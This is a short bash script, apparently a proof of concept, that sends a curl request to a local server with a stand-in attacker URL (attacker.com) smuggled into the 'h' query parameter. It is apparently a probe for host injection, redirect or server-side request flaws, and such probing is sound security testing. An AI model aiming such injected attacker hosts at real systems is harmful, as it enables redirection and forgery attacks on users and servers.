#!/bin/bash
# Craft a malicious host in the 'h' query parameter
# Example: http://attacker.com
# Send the request to the server
curl -X GET http://localhost:3000/?h=http://attacker.com
